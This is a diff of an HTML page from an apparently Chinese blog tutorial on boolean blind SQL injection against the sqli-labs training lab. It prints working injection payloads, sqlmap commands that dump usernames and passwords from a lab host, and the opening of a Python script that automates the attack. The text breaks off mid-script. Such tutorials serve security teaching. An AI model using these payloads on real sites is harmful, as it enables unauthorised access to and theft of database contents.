+<p><strong>3.数据库相关–Information_schema库</strong></p>
 <ul>
 <li><code>information_schema</code>，系统数据库，包含所有数据库相关信息。</li>
 <li><code>information_schema.schemata</code>中<code>schema_name</code>列，字段为所有数据库名称。</li>
 <li><code>information_schema.tables</code>中<code>table_name</code>列对应数据库所有表名</li>
 <li><code>information_schema.columns</code>中，<code>column_name</code>列对应所有列名</li>
 </ul>
-<h4 id="4-连接字符串函数"><a href="#4-连接字符串函数" class="headerlink" title="4.连接字符串函数"></a><strong>4.连接字符串函数</strong></h4><p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https%3A%2F%2Fbaijiahao.baidu.com%2Fs%3Fid%3D1595349117525189591%26wfr%3Dspider%26for%3Dpc">concat(),concat_ws()与及group_concat()的用法</a></p>
+<h4 id="4-连接字符串函数"><a href="#4-连接字符串函数" class="headerlink" title="4.连接字符串函数"></a><strong>4.连接字符串函数</strong></h4><p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://baijiahao.baidu.com/s?id=1595349117525189591&wfr=spider&for=pc">concat(),concat_ws()与及group_concat()的用法</a></p>
 <ul>
 <li><p><code>concat(str1,str2,…)</code>——没有分隔符地连接字符串</p>
 </li>
@@ -1135,7 +1137,7 @@ site:https://jwt1399.top inurl:.html
 </li>
 </ul>
 <p><strong>6.MySQL常用的系统函数</strong></p>
-<pre class="line-numbers language-lang-mysql"><code class="language-lang-mysql">version()            #MySQL版本
+<pre class="line-numbers language-mysql"><code class="language-mysql">version()            #MySQL版本
 user()               #数据库用户名
 database()           #数据库名
 @@basedir            #数据库安装路径
@@ -1143,10 +1145,10 @@ database()           #数据库名
 @@version_compile_os #操作系统版本
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>7.MySQL函数</strong></p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">count(*)：返回匹配指定条件的行数。
-rand()：返回0~1间的小数
-floor()：把小数向下取整
-group by语句：把结果分组输出
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span>：返回匹配指定条件的行数。
+rand<span class="token punctuation">(</span><span class="token punctuation">)</span>：返回<span class="token number">0</span><span class="token operator">~</span><span class="token number">1</span>间的小数
+floor<span class="token punctuation">(</span><span class="token punctuation">)</span>：把小数向下取整
+<span class="token keyword">group</span> <span class="token keyword">by</span>语句：把结果分组输出
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>8.<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xishaonian/p/6036909.html">sql注入之你问我答</a></strong></p>
 <h2 id="二、盲注"><a href="#二、盲注" class="headerlink" title="二、盲注"></a>二、盲注</h2><blockquote>
@@ -1154,16 +1156,14 @@ group by语句：把结果分组输出
 </blockquote>
 <h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="手工盲注思路"><a href="#手工盲注思路" class="headerlink" title="手工盲注思路"></a>手工盲注思路</h4><p>手工盲注的过程，就像你与一个机器人聊天，<br>这个机器人知道的很多，但只会回答“<code>是</code>”或者“<code>不是</code>”，<br>因此你需要询问它这样的问题，例如“<code>数据库名字的第一个字母是不是a啊？</code>”<br>通过这种机械的询问，最终获得你想要的数据。</p>
 <h4 id="手工盲注的步骤"><a href="#手工盲注的步骤" class="headerlink" title="手工盲注的步骤"></a>手工盲注的步骤</h4><p>1.判断是否存在注入，注入是字符型还是数字型<br>2.猜解当前数据库名<br>3.猜解数据库中的表名<br>4.猜解表中的字段名<br>5.猜解数据</p>
-<h4 id="盲注常用函数"><a href="#盲注常用函数" class="headerlink" title="盲注常用函数"></a>盲注常用函数</h4><div class="table-container">
-<table>
+<h4 id="盲注常用函数"><a href="#盲注常用函数" class="headerlink" title="盲注常用函数"></a>盲注常用函数</h4><table>
 <thead>
 <tr>
 <th>函数</th>
 <th>描述</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>left(字符串，截取长度)</td>
 <td>从左边截取指定长度的字符串</td>
 </tr>
@@ -1195,212 +1195,211 @@ group by语句：把结果分组输出
 <td>if(参数1，参数2，参数3)</td>
 <td>参数1为条件，当参数1返回的结果为true时，执行参数2，否则执行参数3</td>
 </tr>
-</tbody>
-</table>
-</div>
+</tbody></table>
 <h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="布尔注入利用情景"><a href="#布尔注入利用情景" class="headerlink" title="布尔注入利用情景"></a><strong>布尔注入利用情景</strong></h4><ul>
 <li>页面上没有显示位，并且没有输出SQL语句执行错误信息</li>
 <li>只能通过页面返回正常与不正常判断</li>
 </ul>
 <h4 id="手工实现布尔盲注"><a href="#手工实现布尔盲注" class="headerlink" title="手工实现布尔盲注"></a>手工实现布尔盲注</h4><p>靶机：sqli-labs第5关</p>
-<h5 id="1-查看页面变化，判断sql注入类别"><a href="#1-查看页面变化，判断sql注入类别" class="headerlink" title="1 .查看页面变化，判断sql注入类别"></a>1 .查看页面变化，判断sql注入类别</h5><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">?id=1 and 1=1
-?id=1 and 1=2
+<h5 id="1-查看页面变化，判断sql注入类别"><a href="#1-查看页面变化，判断sql注入类别" class="headerlink" title="1 .查看页面变化，判断sql注入类别"></a>1 .查看页面变化，判断sql注入类别</h5><pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>
+?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span>
 【字符型】
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h5 id="2-猜解数据库长度"><a href="#2-猜解数据库长度" class="headerlink" title="2.猜解数据库长度"></a>2.猜解数据库长度</h5><p>使用length()判断数据库长度，二分法可提高效率</p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">?id=1' and length(database())>5 --+
-?id=1' and length(database())<10 --+
-?id=1' and length(database())=8 --+
-【length=8】
+<pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span> <span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">10</span> <span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">8</span> <span class="token comment" spellcheck="true">--+</span>
+【length<span class="token operator">=</span><span class="token number">8</span>】
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h5 id="3-猜当前数据库名"><a href="#3-猜当前数据库名" class="headerlink" title="3.猜当前数据库名"></a>3.猜当前数据库名</h5><h6 id="方法1：使用substr函数"><a href="#方法1：使用substr函数" class="headerlink" title="方法1：使用substr函数"></a>方法1：使用<code>substr函数</code></h6><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">?id=1' and substr(database(),1,1)>'r'--+
-?id=1' and substr(database(),1,1)<'t'--+
-?id=1' and substr(database(),1,1)='s'--+
-?id=1' and substr(database(),2,1)='e'--+
-...
-?id=1' and substr(database(),8,1)='y'--+
+<h5 id="3-猜当前数据库名"><a href="#3-猜当前数据库名" class="headerlink" title="3.猜当前数据库名"></a>3.猜当前数据库名</h5><h6 id="方法1：使用substr函数"><a href="#方法1：使用substr函数" class="headerlink" title="方法1：使用substr函数"></a>方法1：使用<code>substr函数</code></h6><pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr(database(),1,1)>'</span>r'<span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr(database(),1,1)&lt;'</span>t'<span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr(database(),1,1)='</span>s'<span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr(database(),2,1)='</span><span class="token number">e</span>'<span class="token comment" spellcheck="true">--+</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr(database(),8,1)='</span>y'<span class="token comment" spellcheck="true">--+</span>
 【security】
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h6 id="方法2：使用ascii函数和substr函数"><a href="#方法2：使用ascii函数和substr函数" class="headerlink" title="方法2：使用ascii函数和substr函数"></a>方法2：使用<code>ascii函数和substr函数</code></h6><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">?id=1' and ascii(substr(database(),1,1))>114 --+
-?id=1' and ascii(substr(database(),1,1))<116 --+
-?id=1' and ascii(substr(database(),1,1))=115 --+
+<h6 id="方法2：使用ascii函数和substr函数"><a href="#方法2：使用ascii函数和substr函数" class="headerlink" title="方法2：使用ascii函数和substr函数"></a>方法2：使用<code>ascii函数和substr函数</code></h6><pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">114</span> <span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">116</span> <span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">115</span> <span class="token comment" spellcheck="true">--+</span>
 【security】
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2020/05/15/Pqd31eKrgQbzCfL.png" alt="ASCill表"></p>
-<h6 id="方法3：使用left函数"><a href="#方法3：使用left函数" class="headerlink" title="方法3：使用left函数"></a>方法3：使用<code>left函数</code></h6><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">?id=1' and left(database(),1)>'r'--+
-?id=1' and left(database(),1)<'t'--+
-?id=1' and left(database(),1)='s' --+
-?id=1' and left(database(),2)='se' --+
-?id=1' and left(database(),3)='sec' --+
-...
-?id=1' and left(database(),8)='security' --+
+<h6 id="方法3：使用left函数"><a href="#方法3：使用left函数" class="headerlink" title="方法3：使用left函数"></a>方法3：使用<code>left函数</code></h6><pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and left(database(),1)>'</span>r'<span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and left(database(),1)&lt;'</span>t'<span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and left(database(),1)='</span>s' <span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and left(database(),2)='</span>se' <span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and left(database(),3)='</span>sec' <span class="token comment" spellcheck="true">--+</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and left(database(),8)='</span>security' <span class="token comment" spellcheck="true">--+</span>
 【security】
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h6 id="方法4：使用Burpsuite的Intruder模块"><a href="#方法4：使用Burpsuite的Intruder模块" class="headerlink" title="方法4：使用Burpsuite的Intruder模块"></a>方法4：使用<code>Burpsuite的Intruder模块</code></h6><p>将获取数据库第一个字符的请求包拦截并发送到Intruder模块</p>
 <p>设置攻击变量以及攻击类型</p>
-<p><img src="https://i.loli.net/2020/05/15/k9ZnQNwtxCaPFEK.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/15/k9ZnQNwtxCaPFEK.png"></p>
 <p>设置第一个攻击变量，这个变量是控制第几个字符的</p>
-<p><img src="https://i.loli.net/2020/05/15/Q9VEkKqtIJOcPdh.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/15/Q9VEkKqtIJOcPdh.png"></p>
 <p>设置第二个攻击变量，这个变量是数据库名字符</p>
-<p><img src="https://i.loli.net/2020/05/15/Ruzc9a1JPyVfKq3.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/15/Ruzc9a1JPyVfKq3.png"></p>
 <p>开始攻击，一小会就能得到测试结果，通过对长度和变量进行排序可以看到数据库名成功得到</p>
-<p><img src="https://i.loli.net/2020/05/15/zixp5ct3E82unDX.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/15/zixp5ct3E82unDX.png"></p>
 <h5 id="4-判断表的个数"><a href="#4-判断表的个数" class="headerlink" title="4.判断表的个数"></a>4.判断表的个数</h5><p>count()函数是用来统计表中记录的一个函数，返回匹配条件的行数。</p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())>0 --+
-?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+
-【4个表】
+<pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span> <span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">4</span> <span class="token comment" spellcheck="true">--+</span>
+【<span class="token number">4</span>个表】
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h5 id="5-判断表的长度"><a href="#5-判断表的长度" class="headerlink" title="5.判断表的长度"></a>5.判断表的长度</h5><p>limit可以被用于强制select语句返回指定的条数。</p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+
-【第一个表长度为6】
+<pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> length<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">6</span> <span class="token comment" spellcheck="true">--+</span>
+【第一个表长度为<span class="token number">6</span>】
 
-?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=8 --+
-【第二个表长度为8】
+?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> length<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">8</span> <span class="token comment" spellcheck="true">--+</span>
+【第二个表长度为<span class="token number">8</span>】
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h5 id="6-猜解表名"><a href="#6-猜解表名" class="headerlink" title="6.猜解表名"></a>6.猜解表名</h5><h6 id="方法1：使用substr函数-1"><a href="#方法1：使用substr函数-1" class="headerlink" title="方法1：使用substr函数"></a>方法1：使用<code>substr函数</code></h6><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)>'d' --+
-?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)>'f' --+
-?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='e' --+
-...
-?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),6,1)='s' --+
+<h5 id="6-猜解表名"><a href="#6-猜解表名" class="headerlink" title="6.猜解表名"></a>6.猜解表名</h5><h6 id="方法1：使用substr函数-1"><a href="#方法1：使用substr函数-1" class="headerlink" title="方法1：使用substr函数"></a>方法1：使用<code>substr函数</code></h6><pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)>'</span><span class="token number">d</span>' <span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)>'</span><span class="token number">f</span>' <span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='</span><span class="token number">e</span>' <span class="token comment" spellcheck="true">--+</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),6,1)='</span>s' <span class="token comment" spellcheck="true">--+</span>
 【第一个表名为emails】
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h6 id="方法2：使用Burpsuite的Intruder模块"><a href="#方法2：使用Burpsuite的Intruder模块" class="headerlink" title="方法2：使用Burpsuite的Intruder模块"></a>方法2：使用<code>Burpsuite的Intruder模块</code></h6><p>使用方法跟上方获得数据库名一样，就不赘述了</p>
-<p><img src="https://i.loli.net/2020/05/15/4O3Hv2Iekq7tSzw.png" alt=""></p>
-<p><img src="https://i.loli.net/2020/05/15/bdvhEPFcnsYTwQJ.png" alt=""></p>
-<h5 id="7-猜解字段名和字段信息"><a href="#7-猜解字段名和字段信息" class="headerlink" title="7.猜解字段名和字段信息"></a>7.猜解字段名和字段信息</h5><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">#确定字段个数
-?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name = 'users')>0 --+
-?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name = 'users')=3 --+
-【字段个数为3】
+<p><img src="https://i.loli.net/2020/05/15/4O3Hv2Iekq7tSzw.png"></p>
+<p><img src="https://i.loli.net/2020/05/15/bdvhEPFcnsYTwQJ.png"></p>
+<h5 id="7-猜解字段名和字段信息"><a href="#7-猜解字段名和字段信息" class="headerlink" title="7.猜解字段名和字段信息"></a>7.猜解字段名和字段信息</h5><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#确定字段个数</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name = '</span>users'<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span> <span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name = '</span>users'<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">3</span> <span class="token comment" spellcheck="true">--+</span>
+【字段个数为<span class="token number">3</span>】
 
-#确定字段名的长度
-?id=1' and length((select  column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1))>0 --+
-?id=1' and length((select  column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1))=2 --+
-?id=1' and length((select  column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 1,1))=8 --+
-【第一个字段长度为2，第二个字段长度为8】
+<span class="token comment" spellcheck="true">#确定字段名的长度</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and length((select  column_name from information_schema.columns where table_schema=database() and table_name = '</span>users' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span> <span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and length((select  column_name from information_schema.columns where table_schema=database() and table_name = '</span>users' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">2</span> <span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and length((select  column_name from information_schema.columns where table_schema=database() and table_name = '</span>users' <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">8</span> <span class="token comment" spellcheck="true">--+</span>
+【第一个字段长度为<span class="token number">2</span>，第二个字段长度为<span class="token number">8</span>】
 
-#猜字段名 同上使用burp
-?id=1' and substr((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1),1,1)='i'  --+
-【...id,username,password...】
+<span class="token comment" spellcheck="true">#猜字段名 同上使用burp</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr((select column_name from information_schema.columns where table_schema=database() and table_name = '</span>users<span class="token string">' limit 0,1),1,1)='</span>i'  <span class="token comment" spellcheck="true">--+</span>
+【<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>】
 
-#确定字段数据长度
-?id=1' and length((select username from users limit 0,1))=4  --+
-【第一个字段数据长度为4】
+<span class="token comment" spellcheck="true">#确定字段数据长度</span>
+?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> length<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">4</span>  <span class="token comment" spellcheck="true">--+</span>
+【第一个字段数据长度为<span class="token number">4</span>】
 
-#猜解字段数据 同上使用burp
-?id=1' and substr((select username from users limit 0,1),1,1)='d'  --+
+<span class="token comment" spellcheck="true">#猜解字段数据 同上使用burp</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr((select username from users limit 0,1),1,1)='</span><span class="token number">d</span>'  <span class="token comment" spellcheck="true">--+</span>
 
-?id=1' and ascii(substr((select username from users limit 0,1),1,1))>79  --+
+?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">79</span>  <span class="token comment" spellcheck="true">--+</span>
 【第一个username数据为dumb】
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="SqlMap实现布尔盲注"><a href="#SqlMap实现布尔盲注" class="headerlink" title="SqlMap实现布尔盲注"></a>SqlMap实现布尔盲注</h4><pre><code>--batch: 用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。
 --technique:选择注入技术，B:Boolean-based-blind  （布尔型盲注）
 --threads 10 :设置线程为10，运行速度会更快
-</code></pre><pre class="line-numbers language-lang-bash"><code class="language-lang-bash">#查询数据库 #【security】
-python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B --dbs --batch --threads 10
+</code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#查询数据库 #【security】</span>
+python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id<span class="token operator">=</span>1 --technique B --dbs --batch --threads 10
 
-#获取数据库中的表 #【emails、referers、uagents、users】
-python sqlmap.py  -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B -D security  --tables --batch --threads 10
+<span class="token comment" spellcheck="true">#获取数据库中的表 #【emails、referers、uagents、users】</span>
+python sqlmap.py  -u http://139.224.112.182:8087/sqli1/Less-5/?id<span class="token operator">=</span>1 --technique B -D security  --tables --batch --threads 10
 
-#获取表中的字段名 #【id、username、password】
-python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B -D security -T users --columns --batch --threads 10
+<span class="token comment" spellcheck="true">#获取表中的字段名 #【id、username、password】</span>
+python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id<span class="token operator">=</span>1 --technique B -D security -T <span class="token function">users</span> --columns --batch --threads 10
 
-#获取字段信息 #【Dumb|Dumb、dhakkan|dumbo ...】
-python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B -D security -T users -C username,password --dump --batch --threads 10
+<span class="token comment" spellcheck="true">#获取字段信息 #【Dumb|Dumb、dhakkan|dumbo ...】</span>
+python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id<span class="token operator">=</span>1 --technique B -D security -T <span class="token function">users</span> -C username,password --dump --batch --threads 10
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="脚本实现布尔盲注"><a href="#脚本实现布尔盲注" class="headerlink" title="脚本实现布尔盲注"></a>脚本实现布尔盲注</h4><h5 id="1-获取数据库名长度"><a href="#1-获取数据库名长度" class="headerlink" title="1.获取数据库名长度"></a>1.获取数据库名长度</h5><pre class="line-numbers language-lang-python"><code class="language-lang-python"># coding:utf-8
-import requests
+<h4 id="脚本实现布尔盲注"><a href="#脚本实现布尔盲注" class="headerlink" title="脚本实现布尔盲注"></a>脚本实现布尔盲注</h4><h5 id="1-获取数据库名长度"><a href="#1-获取数据库名长度" class="headerlink" title="1.获取数据库名长度"></a>1.获取数据库名长度</h5><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span>
+<span class="token keyword">import</span> requests
 
-# 获取数据库名长度
-def database_len():
-    for i in range(1, 10):
-        url = '''http://139.224.112.182:8087/sqli1/Less-5/'''
-        payload = '''?id=1' and length(database())=%d''' %i
-        r = requests.get(url + payload + '%23') # %23 <==> --+
-        if 'You are in' in r.text:
-            print('database_length:', i)
-            break
-        else:
-            print(i)
+<span class="token comment" spellcheck="true"># 获取数据库名长度</span>
+<span class="token keyword">def</span> <span class="token function">database_len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
